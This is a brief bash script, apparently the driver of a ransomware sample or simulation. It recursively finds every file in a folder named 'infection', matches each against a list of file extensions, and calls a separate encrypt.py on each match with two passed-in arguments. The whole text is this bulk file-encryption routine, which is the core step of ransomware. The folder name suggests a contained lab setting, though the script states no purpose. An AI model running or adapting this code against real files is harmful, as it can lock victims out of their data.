#!/bin/bash
IFS=$'\n'

for file in $(find $HOME/infection -type f)
do
	for ex in $(cat /code/extensions)
	do
		if [[ "$file" =~ "$ex"$ ]]
		then
			python3 encrypt.py $file $1 $2
			break
		fi
	done
done
